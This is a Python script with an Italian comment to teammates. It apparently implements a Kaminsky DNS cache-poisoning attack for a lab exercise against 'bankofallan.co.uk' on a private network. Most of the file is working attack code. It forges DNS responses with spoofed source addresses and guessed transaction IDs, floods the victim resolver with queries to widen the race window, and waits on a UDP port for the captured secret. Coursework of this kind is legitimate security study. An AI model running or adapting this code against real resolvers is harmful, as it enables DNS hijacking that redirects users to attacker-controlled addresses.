import socket
import threading
from dnslib import *
from scapy.all import *
import os

'''
PER ANDREA E DANIELE - COME FUNZIONA IL CODICE (È UNA BOZZA)
 
Nella prima parte della funzione main si ricavano alcuni paramentri mancanti,
ovvero l'indirizzo ip del web server e l'indirizzo ip del dns autoritativo per il web sever,
(che nel nostro caso coincidono in quanto si appoggiano allo stesso server, ma non 
è necessariamente sempre così). Successivamente si creano tre thread affinche possano svolgersi
tre funzioni in contemporanea: "flood", "secret", "dos" (i nomi probabile andranno cambiati).

- la funzione "secret" apre una socket UDP sulla porta 1337 affinchè possa ricevere il segreto

- la funzione "dos" simula un Denial of Service mandando costantemente richieste al victim nameserver
  per un un dominio inesistente affinchè venga rallentanto il processo di creazione del QUID (ciò aumenta
  la probabilità di indovinare il quid)

- la funzione "flood" prende il QUID attuale (mandando prima una richiesta per "badgyu.ru", ovvero noi)
  e successivamente manda una serie di pacchetti spoofati che simula la riposta alla query bankofallan.co.uk
  (hanno come indirizzo sorgente quello di bankofallan, quindi sembra che vengano da li piuttosto che dal
  nostro pc)

  se tutto va bene il segreto viene stampato e i tre thread escono dal ciclo e si chiudono. Andranno
  modificate le variabili globali ed eliminate alcune rindondanze, ma a grandi linee dovremmo esserci.

  se volete testare su Linux:

  sudo apt install python3-dnslib
  sudo apt install python3-scapy

  (sono alcune librerie esterne che non fanno parte di quelle standard offerteci dal pitone)

  per farlo girare

  python3 kaminsky.py

  fatemi sapere se tutto gira, eventualmente utilizzare questo testo per fare una bozzetta nel report

'''

# variabili globali, da eliminare come la peste
host_ip = "192.168.56.1"
badguy_domain = "badguy.ru"
bankofallan_fake = "abc.bankofallan.co.uk"
additional_domain = "bankofallan.co.uk"	
#target_dns = "192.168.56.101"

received = False

# funzione da sistemare, può migliorare la creazione di pacchetti spoofati
'''
def create_packet(src_ip, dst_ip, s_port, d_port, domain, q_type):
    packet = (
        IP(src=src_ip, dst=dst_ip)      /
        UDP(sport=s_port, dport=d_port) /
        DNS(id = 111, rd = 1, qr =0, z = 0, qdcount = 1, qd=DNSRR(rrname = domain, type = q_type, rclass="IN"))
    )
    return packet
'''

def question(domain, type=QTYPE.A, port=5555, dest_ip="192.168.56.101", quid=False):

    sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', port))

    question = DNSQuestion(domain,type)
    query = DNSRecord(q=question)

    sock.sendto(bytes(query.pack()),(dest_ip,53))
    data, addr = sock.recvfrom(1024)
    
    sock.close()
    
    if quid:
        quid = DNSRecord.parse(data).header.id
        return quid, addr[1]
    
    else:
        ip_res = DNSRecord.parse(data).a.rdata
        return str(ip_res)


def flood(src_ip, dest_ip):
    increment = 5
    packetsToSend = 5

    while not received:
        queryID, queryPort = question("badguy.ru", port=55553, quid=True)
        spoofing_set = range(queryID + increment, queryID + increment + packetsToSend)

        packets = []
        for i in spoofing_set:

            #question = DNSQuestion(bankofallan_fake,QTYPE.A)
            #answer = RR(bankofallan_fake,rdata=A("192.168.1.100"),ttl=3600)
            #dns = DNSRecord(DNSHeader(id=i,qr=1,aa=1,ra=0),q=question,a=answer)ip_to_inject

            packet = (
                IP(src=src_ip, dst=dest_ip) /
                UDP(sport=53, dport=queryPort) /

                #bytes(dns.pack())

                DNS(id=i, rd=0, qd=DNSQR(qname=bankofallan_fake), qr=1, aa=1, ra=0, z=0, rcode=0, qdcount=1, ancount=1, nscount=0, arcount=1, ar=DNSRR(rrname=bankofallan_fake, rdata="192.168.1.100", type="A", rclass="IN", ttl=3600)) /
                DNSRR(rrname=additional_domain, rdata="192.168.1.100", type="A", rclass="IN", ttl=3600)
            )
            packets.append(packet)

        for udp_packet in packets:
                send(udp_packet, verbose=0)

def dos():    
    while not received:     
        packet = (
            IP(src=host_dns_ip, dst=victim_dns_addr) /
            UDP(sport=55555, dport=53) /
            DNS(id = 111, rd = 1, qr =0, z = 0, qdcount = 1, qd=DNSRR(rrname = "abc.bankofallan.co.uk", type = "A", rclass="IN"))
        )
        send(packet, verbose=0)

def secret():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', 1337))
    
    data, addr = sock.recvfrom(4096)
    print(data)
    
    global received
    received = True
    
    sock.close()

    return secret


if __name__=='__main__':

    host_domain = "badguy.ru"                 # this could be a cmd line argument
    host_dns_ip = "192.168.56.1"              # this could be a cmd line argument  
    victim_dns_addr = "192.168.56.101"            # this could be a cmd line argument    
    target_domain = "bankofallan.co.uk"         # this could be a cmd line argument
    fake_ip = "1.2.3.4"                         # this could be a cmd line argument

    target_addr = question(target_domain)
    target_dns_addr = question(target_domain, QTYPE.NS)

    threads = []
    threads.append(threading.Thread(target=secret))
    threads.append(threading.Thread(target=dos))
    threads.append(threading.Thread(target=flood, args=(target_addr, victim_dns_addr)))

    for t in threads:
        t.start()
